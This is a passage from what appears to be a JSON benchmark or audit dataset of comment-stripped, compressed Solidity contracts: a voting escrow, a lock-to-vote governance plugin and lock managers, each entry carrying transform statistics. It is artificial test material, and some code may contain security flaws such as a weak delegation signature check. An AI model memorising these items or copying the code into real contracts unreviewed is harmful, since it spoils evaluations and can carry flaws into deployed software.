{\nIVoter(voter).poke(_tokenId);\n}\nemit MetadataUpdate(_tokenId);\n}\nfunction increase_unlock_time(uint _tokenId, uint _lock_duration) external nonreentrant {\nassert(_isApprovedOrOwner(msg.sender, _tokenId));\nIVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\nrequire(!_locked.isPermanent, \"!NORM\");\nuint unlock_time = (block.timestamp + _lock_duration) / WEEK * WEEK;\nrequire(_locked.end > block.timestamp && _locked.amount > 0, 'EXP||ZV');\nrequire(unlock_time > _locked.end && (unlock_time <= block.timestamp + MAXTIME), 'IUT');\n_deposit_for(_tokenId, 0, unlock_time, _locked, DepositType.INCREASE_UNLOCK_TIME);\nif(voted[_tokenId]) {\nIVoter(voter).poke(_tokenId);\n}\nemit MetadataUpdate(_tokenId);\n}\nfunction withdraw(uint _tokenId) external nonreentrant {\nassert(_isApprovedOrOwner(msg.sender, _tokenId));\nrequire(attachments[_tokenId] == 0 && !voted[_tokenId], \"ATT\");\nIVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\nrequire(!_locked.isPermanent, \"!NORM\");\nrequire(block.timestamp >= _locked.end, \"!EXP\");\nuint value = uint(int256(_locked.amount));\nlocked[_tokenId] = IVotingEscrow.LockedBalance(0, 0, false);\nuint supply_before = supply;\nsupply = supply_before - value;\n_checkpoint(_tokenId, _locked, IVotingEscrow.LockedBalance(0, 0, false));\nassert(IERC20(token).transfer(msg.sender, value));\n_burn(_tokenId);\nemit Withdraw(msg.sender, _tokenId, value, block.timestamp);\nemit Supply(supply_before, supply_before - value);\n}\nfunction lockPermanent(uint _tokenId) external {\naddress sender = msg.sender;\nrequire(_isApprovedOrOwner(sender, _tokenId), \"NAO\");\nIVotingEscrow.LockedBalance memory _newLocked = locked[_tokenId];\nrequire(!_newLocked.isPermanent, \"!NORM\");\nrequire(_newLocked.end > block.timestamp, \"EXP\");\nrequire(_newLocked.amount > 0, \"ZV\");\nuint _amount = uint(int256(_newLocked.amount));\npermanentLockBalance += _amount;\n_newLocked.end = 0;\n_newLocked.isPermanent = true;\n_checkpoint(_tokenId, locked[_tokenId], _newLocked);\nlocked[_tokenId] = _newLocked;\nif(voted[_tokenId]) {\nIVoter(voter).poke(_tokenId);\n}\nemit LockPermanent(sender, _tokenId, _amount, block.timestamp);\nemit MetadataUpdate(_tokenId);\n}\nfunction unlockPermanent(uint _tokenId) external {\naddress sender = msg.sender;\nrequire(_isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\nrequire(attachments[_tokenId] == 0 && !voted[_tokenId], \"ATT\");\nIVotingEscrow.LockedBalance memory _newLocked = locked[_tokenId];\nrequire(_newLocked.isPermanent, \"!NORM\");\nuint _amount = uint(int256(_newLocked.amount));\npermanentLockBalance -= _amount;\n_newLocked.end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;\n_newLocked.isPermanent = false;\n_checkpoint(_tokenId, locked[_tokenId], _newLocked);\nlocked[_tokenId] = _newLocked;\nemit UnlockPermanent(sender, _tokenId, _amount, block.timestamp);\nemit MetadataUpdate(_tokenId);\n}\nfunction balanceOfNFT(uint _tokenId) external view returns (uint) {\nif (ownership_change[_tokenId] == block.number) return 0;\nreturn VotingBalanceLogic.balanceOfNFT(_tokenId, block.timestamp, votingBalanceLogicData);\n}\nfunction balanceOfNFTAt(uint _tokenId, uint _t) external view returns (uint) {\nreturn VotingBalanceLogic.balanceOfNFT(_tokenId, _t, votingBalanceLogicData);\n}\nfunction balanceOfAtNFT(uint _tokenId, uint _block) external view returns (uint) {\nreturn VotingBalanceLogic.balanceOfAtNFT(_tokenId, _block, votingBalanceLogicData, epoch);\n}\nfunction totalSupplyAt(uint _block) external view returns (uint) {\nreturn VotingBalanceLogic.totalSupplyAt(_block, epoch, votingBalanceLogicData, slope_changes);\n}\nfunction totalSupply() external view returns (uint) {\nreturn totalSupplyAtT(block.timestamp);\n}\nfunction totalSupplyAtT(uint t) public view returns (uint) {\nreturn VotingBalanceLogic.totalSupplyAtT(t, epoch, slope_changes, votingBalanceLogicData);\n}\nmapping(uint => uint) public attachments;\nmapping(uint => bool) public voted;\nfunction setVoter(address _voter) external {\nrequire(msg.sender == team);\nvoter = _voter;\n}\nfunction voting(uint _tokenId) external {\nrequire(msg.sender == voter);\nvoted[_tokenId] = true;\n}\nfunction abstain(uint _tokenId) external {\nrequire(msg.sender == voter, \"NA\");\nvoted[_tokenId] = false;\n}\nfunction attach(uint _tokenId) external {\nrequire(msg.sender == voter, \"NA\");\nattachments[_tokenId] = attachments[_tokenId] + 1;\n}\nfunction detach(uint _tokenId) external {\nrequire(msg.sender == voter, \"NA\");\nattachments[_tokenId] = attachments[_tokenId] - 1;\n}\nfunction merge(uint _from, uint _to) external nonreentrant notPartnerNFT(_from) {\nrequire(attachments[_from] == 0 && !voted[_from], \"ATT\");\nrequire(_from != _to, \"SAME\");\nrequire(_isApprovedOrOwner(msg.sender, _from) &&\n_isApprovedOrOwner(msg.sender, _to), \"NAO\");\nIVotingEscrow.LockedBalance memory _locked0 = locked[_from];\nIVotingEscrow.LockedBalance memory _locked1 = locked[_to];\nrequire(_locked1.end > block.timestamp || _locked1.isPermanent,\"EXP||PERM\");\nrequire(_locked0.isPermanent ? _locked1.isPermanent : true, \"!MERGE\");\nuint value0 = uint(int256(_locked0.amount));\nuint end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;\nlocked[_from] = IVotingEscrow.LockedBalance(0, 0, false);\n_checkpoint(_from, _locked0, IVotingEscrow.LockedBalance(0, 0, false));\n_burn(_from);\nIVotingEscrow.LockedBalance memory newLockedTo;\nnewLockedTo.isPermanent = _locked1.isPermanent;\nif (newLockedTo.isPermanent){\nnewLockedTo.amount = _locked1.amount + _locked0.amount;\nif (!_locked0.isPermanent) {\npermanentLockBalance += value0;\n}\n}else{\nnewLockedTo.amount = _locked1.amount + _locked0.amount;\nnewLockedTo.end = end;\n}\n_checkpoint(_to, _locked1, newLockedTo);\nlocked[_to] = newLockedTo;\nif(voted[_to]) {\nIVoter(voter).poke(_to);\n}\nemit Merge(\nmsg.sender,\n_from,\n_to,\nuint(int256(_locked0.amount)),\nuint(int256(_locked1.amount)),\nuint(int256(newLockedTo.amount)),\nnewLockedTo.end,\nblock.timestamp\n);\nemit MetadataUpdate(_to);\n}\nfunction multiSplit(\nuint _from,\nuint[] memory amounts\n) external nonreentrant splitAllowed(_from) notPartnerNFT(_from) returns (uint256[] memory newTokenIds) {\nrequire(amounts.length >= 2 && amounts.length <= 10, \"MIN2MAX10\");\naddress owner = idToOwner[_from];\nIVotingEscrow.LockedBalance memory originalLocked = locked[_from];\nrequire(originalLocked.end > block.timestamp || originalLocked.isPermanent, \"EXP\");\nrequire(originalLocked.amount > 0, \"ZV\");\nuint totalWeight = 0;\nfor(uint i = 0; i < amounts.length; i++) {\nrequire(amounts[i] > 0, \"ZW\");\ntotalWeight += amounts[i];\n}\nlocked[_from] = IVotingEscrow.LockedBalance(0, 0, false);\n_checkpoint(_from, originalLocked, IVotingEscrow.LockedBalance(0, 0, false));\n_burn(_from);\nnewTokenIds = new uint256[](amounts.length);\nuint[] memory actualAmounts = new uint[](amounts.length);\nfor(uint i = 0; i < amounts.length; i++) {\nIVotingEscrow.LockedBalance memory newLocked = IVotingEscrow.LockedBalance({\namount: int128(int256(uint256(int256(originalLocked.amount)) * amounts[i] / totalWeight)),\nend: originalLocked.end,\nisPermanent: originalLocked.isPermanent\n});\nnewTokenIds[i] = _createSplitNFT(owner, newLocked);\nactualAmounts[i] = uint256(int256(newLocked.amount));\n}\nemit MultiSplit(\n_from,\nnewTokenIds,\nmsg.sender,\nactualAmounts,\noriginalLocked.end,\nblock.timestamp\n);\n}\nfunction _createSplitNFT(address _to, IVotingEscrow.LockedBalance memory _newLocked) private returns (uint256 _tokenId) {\n_tokenId = ++tokenId;\nlocked[_tokenId] = _newLocked;\n_checkpoint(_tokenId, IVotingEscrow.LockedBalance(0, 0, false), _newLocked);\n_mint(_to, _tokenId);\n}\nfunction toggleSplit(address _account, bool _bool) external {\nrequire(msg.sender == team);\ncanSplit[_account] = _bool;\n}\nbytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\nbytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\nmapping(address => address) private _delegates;\nmapping(address => uint) public nonces;\nfunction delegates(address delegator) public view returns (address) {\naddress current = _delegates[delegator];\nreturn current == address(0) ? delegator : current;\n}\nfunction getVotes(address account) external view returns (uint) {\nuint32 nCheckpoints = cpData.numCheckpoints[account];\nif (nCheckpoints == 0) {\nreturn 0;\n}\nuint[] storage _tokenIds = cpData.checkpoints[account][nCheckpoints - 1].tokenIds;\nuint votes = 0;\nfor (uint i = 0; i < _tokenIds.length; i++) {\nuint tId = _tokenIds[i];\nvotes = votes + VotingBalanceLogic.balanceOfNFT(tId, block.timestamp, votingBalanceLogicData);\n}\nreturn votes;\n}\nfunction getPastVotes(address account, uint timestamp)\npublic\nview\nreturns (uint) {\nuint32 _checkIndex = VotingDelegationLib.getPastVotesIndex(cpData, account, timestamp);\nuint[] storage _tokenIds = cpData.checkpoints[account][_checkIndex].tokenIds;\nuint votes = 0;\nfor (uint i = 0; i < _tokenIds.length; i++) {\nuint tId = _tokenIds[i];\nvotes = votes + VotingBalanceLogic.balanceOfNFT(tId, timestamp, votingBalanceLogicData);\n}\nreturn votes;\n}\nfunction getPastTotalSupply(uint256 timestamp) external view returns (uint) {\nreturn totalSupplyAtT(timestamp);\n}\nfunction _delegate(address delegator, address delegatee) internal {\naddress currentDelegate = delegates(delegator);\n_delegates[delegator] = delegatee;\nemit DelegateChanged(delegator, currentDelegate, delegatee);\nVotingDelegationLib.TokenHelpers memory tokenHelpers = VotingDelegationLib.TokenHelpers({\nownerOfFn: ownerOf,\nownerToNFTokenCountFn: ownerToNFTokenCountFn,\ntokenOfOwnerByIndex:tokenOfOwnerByIndex\n});\nVotingDelegationLib._moveAllDelegates(cpData, delegator, currentDelegate, delegatee, tokenHelpers);\n}\nfunction delegate(address delegatee) public {\nif (delegatee == address(0)) delegatee = msg.sender;\nreturn _delegate(msg.sender, delegatee);\n}\nfunction delegateBySig(\naddress delegatee,\nuint nonce,\nuint expiry,\nuint8 v,\nbytes32 r,\nbytes32 s\n) public {\nrequire(delegatee != msg.sender, \"NA\");\nrequire(delegatee != address(0), \"ZA\");\nbytes32 domainSeparator = keccak256(\nabi.encode(\nDOMAIN_TYPEHASH,\nkeccak256(bytes(name)),\nkeccak256(bytes(version)),\nblock.chainid,\naddress(this)\n)\n);\nbytes32 structHash = keccak256(\nabi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)\n);\nbytes32 digest = keccak256(\nabi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash)\n);\naddress signatory = ecrecover(digest, v, r, s);\nrequire(\nsignatory != address(0),\n\"ZA\"\n);\nrequire(\nnonce == nonces[signatory]++,\n\"!NONCE\"\n);\nrequire(\nblock.timestamp <= expiry,\n\"EXP\"\n);\nreturn _delegate(signatory, delegatee);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 229,
        "mode": "compressed",
        "original_lines": 1338,
        "transformed_lines": 785,
        "original_chars": 55049,
        "transformed_chars": 27945,
        "compression_ratio": 0.51
      },
      "error": null
    },
    {
      "original_id": "sn_gs_011",
      "transformed_id": "ss_l1_compressed_sn_gs_011",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.8;\nimport {ILockToGovernBase} from \"../interfaces/ILockToGovernBase.sol\";\nimport {ILockManager} from \"../interfaces/ILockManager.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/IPermissionCondition.sol\";\nimport {PermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/PermissionCondition.sol\";\ncontract MinVotingPowerCondition is PermissionCondition {\nILockToGovernBase public immutable plugin;\nILockManager public immutable lockManager;\nIERC20 public immutable token;\nconstructor(ILockToGovernBase _plugin) {\nplugin = _plugin;\ntoken = plugin.token();\nlockManager = plugin.lockManager();\n}\nfunction isGranted(address _where, address _who, bytes32 _permissionId, bytes calldata _data)\npublic\nview\noverride\nreturns (bool) {\n(_where, _data, _permissionId);\nuint256 _currentBalance = token.balanceOf(_who) + lockManager.getLockedBalance(_who);\nuint256 _minProposerVotingPower = plugin.minProposerVotingPower();\nreturn _currentBalance >= _minProposerVotingPower;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 51,
        "transformed_lines": 26,
        "original_chars": 2220,
        "transformed_chars": 1128,
        "compression_ratio": 0.51
      },
      "error": null
    },
    {
      "original_id": "sn_gs_012",
      "transformed_id": "ss_l1_compressed_sn_gs_012",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockToGovernBase} from \"./base/LockToGovernBase.sol\";\nimport {ILockToVote} from \"./interfaces/ILockToVote.sol\";\nimport {IDAO} from \"@aragon/osx-commons-contracts/src/dao/IDAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IProposal} from \"@aragon/osx-commons-contracts/src/plugin/extensions/proposal/IProposal.sol\";\nimport {ERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {SafeCastUpgradeable} from \"@openzeppelin/contracts-upgradeable/utils/math/SafeCastUpgradeable.sol\";\nimport {MajorityVotingBase} from \"./base/MajorityVotingBase.sol\";\nimport {ILockToGovernBase} from \"./interfaces/ILockToGovernBase.sol\";\ncontract LockToVotePlugin is ILockToVote, MajorityVotingBase, LockToGovernBase {\nusing SafeCastUpgradeable for uint256;\nbytes4 internal constant LOCK_TO_VOTE_INTERFACE_ID =\nthis.minProposerVotingPower.selector ^ this.createProposal.selector;\nbytes32 public constant CREATE_PROPOSAL_PERMISSION_ID = keccak256(\"CREATE_PROPOSAL_PERMISSION\");\nbytes32 public constant LOCK_MANAGER_PERMISSION_ID = keccak256(\"LOCK_MANAGER_PERMISSION\");\nevent VoteCleared(uint256 proposalId, address voter);\nerror VoteRemovalForbidden(uint256 proposalId, address voter);\nfunction initialize(\nIDAO _dao,\nILockManager _lockManager,\nVotingSettings calldata _votingSettings,\nIPlugin.TargetConfig calldata _targetConfig,\nbytes calldata _pluginMetadata\n) external onlyCallAtInitialization reinitializer(1) {\n__MajorityVotingBase_init(_dao, _votingSettings, _targetConfig, _pluginMetadata);\n__LockToGovernBase_init(_lockManager);\nemit MembershipContractAnnounced({definingContract: address(_lockManager.token())});\n}\nfunction supportsInterface(bytes4 _interfaceId)\npublic\nview\nvirtual\noverride(MajorityVotingBase, LockToGovernBase)\nreturns (bool) {\nreturn _interfaceId == LOCK_TO_VOTE_INTERFACE_ID || _interfaceId == type(ILockToVote).interfaceId\n|| super.supportsInterface(_interfaceId);\n}\nfunction customProposalParamsABI() external pure override returns (string memory) {\nreturn \"(uint256 allowFailureMap)\";\n}\nfunction createProposal(\nbytes calldata _metadata,\nAction[] memory _actions,\nuint64 _startDate,\nuint64 _endDate,\nbytes memory _data\n) external auth(CREATE_PROPOSAL_PERMISSION_ID) returns (uint256 proposalId) {\nuint256 _allowFailureMap;\nif (_data.length != 0) {\n(_allowFailureMap) = abi.decode(_data, (uint256));\n}\nif (currentTokenSupply() == 0) {\nrevert NoVotingPower();\n}\n(_startDate, _endDate) = _validateProposalDates(_startDate, _endDate);\nproposalId = _createProposalId(keccak256(abi.encode(_actions, _metadata)));\nif (_proposalExists(proposalId)) {\nrevert ProposalAlreadyExists(proposalId);\n}\nProposal storage proposal_ = proposals[proposalId];\nproposal_.parameters.votingMode = votingMode();\nproposal_.parameters.supportThresholdRatio = supportThresholdRatio();\nproposal_.parameters.startDate = _startDate;\nproposal_.parameters.endDate = _endDate;\nproposal_.parameters.minParticipationRatio = minParticipationRatio();\nproposal_.parameters.minApprovalRatio = minApprovalRatio();\nproposal_.targetConfig = getTargetConfig();\nif (_allowFailureMap != 0) {\nproposal_.allowFailureMap = _allowFailureMap;\n}\nfor (uint256 i; i < _actions.length;) {\nproposal_.actions.push(_actions[i]);\nunchecked {\n++i;\n}\n}\nemit ProposalCreated(proposalId, _msgSender(), _startDate, _endDate, _metadata, _actions, _allowFailureMap);\nlockManager.proposalCreated(proposalId);\n}\nfunction canVote(uint256 _proposalId, address _voter, VoteOption _voteOption) public view returns (bool) {\nif (!_proposalExists(_proposalId)) {\nrevert NonexistentProposal(_proposalId);\n}\nProposal storage proposal_ = proposals[_proposalId];\nreturn _canVote(proposal_, _voter, _voteOption, lockManager.getLockedBalance(_voter));\n}\nfunction vote(uint256 _proposalId, address _voter, VoteOption _voteOption, uint256 _newVotingPower)\npublic\noverride\nauth(LOCK_MANAGER_PERMISSION_ID) {\nProposal storage proposal_ = proposals[_proposalId];\nif (!_canVote(proposal_, _voter, _voteOption, _newVotingPower)) {\nrevert VoteCastForbidden(_proposalId, _voter);\n}\nif (_voteOption == proposal_.votes[_voter].voteOption) {\nif (_newVotingPower == proposal_.votes[_voter].votingPower) return;\nuint256 diff = _newVotingPower - proposal_.votes[_voter].votingPower;\nproposal_.votes[_voter].votingPower = _newVotingPower;\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes += diff;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no += diff;\n} else {\nproposal_.tally.abstain += diff;\n}\n} else {\nif (proposal_.votes[_voter].votingPower > 0) {\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes -= proposal_.votes[_voter].votingPower;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no -= proposal_.votes[_voter].votingPower;\n} else {\nproposal_.tally.abstain -= proposal_.votes[_voter].votingPower;\n}\n}\nif (_voteOption == VoteOption.Yes) {\nproposal_.tally.yes += _newVotingPower;\n} else if (_voteOption == VoteOption.No) {\nproposal_.tally.no += _newVotingPower;\n} else {\nproposal_.tally.abstain += _newVotingPower;\n}\nproposal_.votes[_voter].voteOption = _voteOption;\nproposal_.votes[_voter].votingPower = _newVotingPower;\n}\nemit VoteCast(_proposalId, _voter, _voteOption, _newVotingPower);\nif (proposal_.parameters.votingMode == VotingMode.EarlyExecution) {\n_attemptEarlyExecution(_proposalId, _msgSender());\n}\n}\nfunction clearVote(uint256 _proposalId, address _voter) external auth(LOCK_MANAGER_PERMISSION_ID) {\nProposal storage proposal_ = proposals[_proposalId];\nif (!_isProposalOpen(proposal_)) {\nrevert VoteRemovalForbidden(_proposalId, _voter);\n} else if (proposal_.parameters.votingMode != VotingMode.VoteReplacement) {\nrevert VoteRemovalForbidden(_proposalId, _voter);\n} else if (proposal_.votes[_voter].votingPower == 0) {\nreturn;\n}\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes -= proposal_.votes[_voter].votingPower;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no -= proposal_.votes[_voter].votingPower;\n}\nelse if (proposal_.votes[_voter].voteOption == VoteOption.Abstain) {\nproposal_.tally.abstain -= proposal_.votes[_voter].votingPower;\n}\nproposal_.votes[_voter].votingPower = 0;\nemit VoteCleared(_proposalId, _voter);\n}\nfunction isProposalOpen(uint256 _proposalId) external view returns (bool) {\nProposal storage proposal_ = proposals[_proposalId];\nreturn _isProposalOpen(proposal_);\n}\nfunction minProposerVotingPower() public view override(ILockToGovernBase, MajorityVotingBase) returns (uint256) {\nreturn MajorityVotingBase.minProposerVotingPower();\n}\nfunction currentTokenSupply() public view override returns (uint256) {\nreturn IERC20(lockManager.token()).totalSupply();\n}\nfunction usedVotingPower(uint256 _proposalId, address _voter) public view returns (uint256) {\nreturn proposals[_proposalId].votes[_voter].votingPower;\n}\nfunction _canVote(Proposal storage proposal_, address _voter, VoteOption _voteOption, uint256 _newVotingPower)\ninternal\nview\nreturns (bool) {\nuint256 _currentVotingPower = proposal_.votes[_voter].votingPower;\nif (!_isProposalOpen(proposal_)) {\nreturn false;\n} else if (_voteOption == VoteOption.None) {\nreturn false;\n}\nelse if (proposal_.parameters.votingMode != VotingMode.VoteReplacement) {\nif (_newVotingPower <= _currentVotingPower) {\nreturn false;\n}\nelse if (\nproposal_.votes[_voter].voteOption != VoteOption.None\n&& _voteOption != proposal_.votes[_voter].voteOption\n) {\nreturn false;\n}\n}\nelse {\nif (_newVotingPower == 0 || _newVotingPower < _currentVotingPower) {\nreturn false;\n}\nelse if (_newVotingPower == _currentVotingPower && _voteOption == proposal_.votes[_voter].voteOption) {\nreturn false;\n}\n}\nreturn true;\n}\nfunction _attemptEarlyExecution(uint256 _proposalId, address _voteCaller) internal {\nif (!_canExecute(_proposalId)) {\nreturn;\n} else if (!dao().hasPermission(address(this), _voteCaller, EXECUTE_PROPOSAL_PERMISSION_ID, _msgData())) {\nreturn;\n}\n_execute(_proposalId);\n}\nfunction _execute(uint256 _proposalId) internal override {\nsuper._execute(_proposalId);\nlockManager.proposalEnded(_proposalId);\n}\nuint256[50] private __gap;\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 65,
        "mode": "compressed",
        "original_lines": 325,
        "transformed_lines": 212,
        "original_chars": 13835,
        "transformed_chars": 8467,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_gs_013",
      "transformed_id": "ss_l1_compressed_sn_gs_013",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport {LockManagerBase} from \"./base/LockManagerBase.sol\";\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockManagerSettings} from \"./interfaces/ILockManager.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\ncontract LockManagerERC20 is ILockManager, LockManagerBase {\nIERC20 private immutable erc20Token;\nconstructor(LockManagerSettings memory _settings, IERC20 _token) LockManagerBase(_settings) {\nerc20Token = _token;\n}\nfunction token() public view virtual returns (address _token) {\nreturn address(erc20Token);\n}\nfunction _incomingTokenBalance() internal view virtual override returns (uint256) {\nreturn erc20Token.allowance(msg.sender, address(this));\n}\nfunction _doLockTransfer(uint256 _amount) internal virtual override {\nerc20Token.transferFrom(msg.sender, address(this), _amount);\n}\nfunction _doUnlockTransfer(address _recipient, uint256 _amount) internal virtual override {\nerc20Token.transfer(_recipient, _amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 10,
        "mode": "compressed",
        "original_lines": 45,
        "transformed_lines": 23,
        "original_chars": 1815,
        "transformed_chars": 1004,
        "compression_ratio": 0.55
      },
      "error": null
    },
    {
      "original_id": "sn_gs_014",
      "transformed_id": "ss_l1_compressed_sn_gs_014",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport {LockManagerBase} from \"./base/LockManagerBase.sol\";\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockManagerSettings} from \"./interfaces/ILockManager.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\ncontract LockManagerERC20 is ILockManager, LockManagerBase {\nIERC20 private immutable erc20Token;\nconstructor(LockManagerSettings memory _settings, IERC20 _token) LockManagerBase(_settings) {\nerc20Token = _token;\n}\nfunction token() public view virtual returns (address _token) {\nreturn address(erc20Token);\n}\nfunction _incomingTokenBalance() internal view virtual override returns (uint256) {\nreturn erc20Token.allowance(msg.sender, address(this));\n}\nfunction _doLockTransfer(uint256 _amount) internal virtual override {\nerc20Token.transferFrom(msg.sender, address(this), _amount);\n}\nfunction _doUnlockTransfer(address _recipient, uint256 _amount) internal virtual override {\nerc20Token.transfer(_recipient, _amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 10,
        "mode": "compressed",
        "original_lines": 45,
        "transformed_lines": 23,
        "original_chars": 1815,
        "transformed_chars": 1004,
        "compression_ratio": 0.55
      },
      "error": null
    },
    {
      "original_id": "sn_gs_015",
      "transformed_id": "ss_l1_compressed_sn_gs_015",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport {ILockManager, LockManagerSettings, PluginMode} from \"../interfaces/ILockManager.sol\";\nimport {ILockToGovernBase} from \"../interfaces/ILockToGovernBase.sol\";\nimport {ILockToVote} from \"../interfaces/ILockToVote.sol\";\nimport {IMajorityVoting} from \"../interfaces/IMajorityVoting.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\nimport {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nabstract contract LockManagerBase is ILockManager {\nusing EnumerableSet for EnumerableSet.UintSet;\nLockManagerSettings public settings;\nILockToGovernBase public plugin;\nmapping(address => uint256) private lockedBalances;\nEnumerableSet.UintSet internal knownProposalIds;\nevent BalanceLocked(address voter, uint256 amount);\nevent BalanceUnlocked(address voter, uint256 amount);\nevent ProposalEnded(uint256 proposalId);\nerror InvalidPluginAddress();\nerror NoBalance();\nerror LocksStillActive();\nerror InvalidPlugin();\nerror InvalidPluginMode();\nerror SetPluginAddressForbidden();\nconstructor(LockManagerSettings memory _settings) {\nsettings.pluginMode = _settings.pluginMode;\n}\nfunction knownProposalIdAt(uint256 _index) public view virtual returns (uint256) {\nreturn knownProposalIds.at(_index);\n}\nfunction knownProposalIdsLength() public view virtual returns (uint256) {\nreturn knownProposalIds.length();\n}\nfunction lock() public virtual {\n_lock(_incomingTokenBalance());\n}\nfunction lock(uint256 _amount) public virtual {\n_lock(_amount);\n}\nfunction lockAndVote(uint256 _proposalId, IMajorityVoting.VoteOption _voteOption) public virtual {\nif (settings.pluginMode != PluginMode.Voting) {\nrevert InvalidPluginMode();\n}\n_lock(_incomingTokenBalance());\n_vote(_proposalId, _voteOption);\n}\nfunction lockAndVote(uint256 _proposalId, IMajorityVoting.VoteOption _voteOption, uint256 _amount) public virtual {\nif (settings.pluginMode != PluginMode.Voting) {\nrevert InvalidPluginMode();\n}\n_lock(_amount);\n_vote(_proposalId, _voteOption);\n}\nfunction vote(uint256 _proposalId, IMajorityVoting.VoteOption _voteOption) public virtual {\nif (settings.pluginMode != PluginMode.Voting) {\nrevert InvalidPluginMode();\n}\n_vote(_proposalId, _voteOption);\n}\nfunction getLockedBalance(address _account) public view virtual returns (uint256) {\nreturn lockedBalances[_account];\n}\nfunction canVote(uint256 _proposalId, address _voter, IMajorityVoting.VoteOption _voteOption)\nexternal\nview\nvirtual\nreturns (bool) {\nreturn ILockToVote(address(plugin)).canVote(_proposalId, _voter, _voteOption);\n}\nfunction unlock() public virtual {\nuint256 _refundableBalance = getLockedBalance(msg.sender);\nif (_refundableBalance == 0) {\nrevert NoBalance();\n}\n_withdrawActiveVotingPower();\nlockedBalances[msg.sender] = 0;\n_doUnlockTransfer(msg.sender, _refundableBalance);\nemit BalanceUnlocked(msg.sender, _refundableBalance);\n}\nfunction proposalCreated(uint256 _proposalId) public virtual {\nif (msg.sender != address(plugin)) {\nrevert InvalidPluginAddress();\n}\nknownProposalIds.add(_proposalId);\n}\nfunction proposalEnded(uint256 _proposalId) public virtual {\nif (msg.sender != address(plugin)) {\nrevert InvalidPluginAddress();\n}\nemit ProposalEnded(_proposalId);\nknownProposalIds.remove(_proposalId);\n}\nfunction setPluginAddress(ILockToGovernBase _newPluginAddress) public virtual {\nif (address(plugin) != address(0)) {\nrevert SetPluginAddressForbidden();\n} else if (!IERC165(address(_newPluginAddress)).supportsInterface(type(ILockToGovernBase).interfaceId)) {\nrevert InvalidPlugin();\n}\nelse if (\nsettings.pluginMode == PluginMode.Voting\n&& !IERC165(address(_newPluginAddress)).supportsInterface(type(ILockToVote).interfaceId)\n) {\nrevert InvalidPlugin();\n}\nplugin = _newPluginAddress;\n}\nfunction _incomingTokenBalance() internal view virtual returns (uint256);\nfunction _lock(uint256 _amount) internal virtual {\nif (_amount == 0) {\nrevert NoBalance();\n}\n_doLockTransfer(_amount);\nlockedBalances[msg.sender] += _amount;\nemit BalanceLocked(msg.sender, _amount);\n}\nfunction _doLockTransfer(uint256 _amount) internal virtual;\nfunction _doUnlockTransfer(address _recipient, uint256 _amount) internal virtual;\nfunction _vote(uint256 _proposalId, IMajorityVoting.VoteOption _voteOption) internal virtual {\nuint256 _currentVotingPower = getLockedBalance(msg.sender);\nILockToVote(address(plugin)).vote(_proposalId, msg.sender, _voteOption, _currentVotingPower);\n}\nfunction _withdrawActiveVotingPower() internal virtual {\nuint256 _proposalCount = knownProposalIds.length();\nfor (uint256 _i; _i < _proposalCount;) {\nuint256 _proposalId = knownProposalIds.at(_i);\nif (!plugin.isProposalOpen(_proposalId)) {\nknownProposalIds.remove(_proposalId);\n_proposalCount = knownProposalIds.length();\nif (_i == 